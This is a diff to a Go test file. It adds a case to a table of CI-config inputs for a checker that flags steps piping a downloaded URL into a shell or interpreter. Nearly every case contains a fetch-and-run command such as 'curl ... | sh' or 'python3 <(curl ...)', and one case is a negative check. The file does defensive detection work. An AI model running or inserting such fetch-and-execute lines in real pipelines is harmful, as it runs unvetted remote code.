@@ -197,6 +197,7 @@ func TestVeto_Backstop(t *testing.T) {
 		{"URL piped into an interpreter", tree(map[string]string{"ci/x.yml": "steps:\n  - run: curl -sS https://example.com/get-inst | python3 - x\n"}), true, "ci/x.yml:2"},
 		{"URL piped into a shell", tree(map[string]string{"ci/x.yml": "steps:\n  - run: curl -sS https://example.com/inst | sh\n"}), true, "ci/x.yml:2"},
 		{"URL piped through a filter into a shell", tree(map[string]string{"ci/x.yml": "steps:\n  - run: curl -sS https://example.com/get-inst | sed 's/a/b/' | sh -s x\n"}), true, "ci/x.yml:2"},
+		{"URL piped into a shell that pipes on", tree(map[string]string{"ci/x.yml": "steps:\n  - run: curl -sS https://example.com/get-inst | sh -s x | tee log\n"}), true, "ci/x.yml:2"},
 		{"URL piped through a filter into nothing that runs it", tree(map[string]string{"ci/x.yml": "steps:\n  - run: curl -sS https://example.com/get-inst | sed 's/a/b/' | tee log\n"}), false, ""},
 		{"URL piped through tee into an interpreter", tree(map[string]string{"ci/x.yml": "steps:\n  - run: curl -sS https://example.com/get-inst | tee g.py | python3 - x\n"}), true, "ci/x.yml:2"},
 		{"URL in a process substitution an interpreter runs", tree(map[string]string{"ci/x.yml": "steps:\n  - run: python3 <(curl -sS https://example.com/get-inst) x\n"}), true, "ci/x.yml:2"},
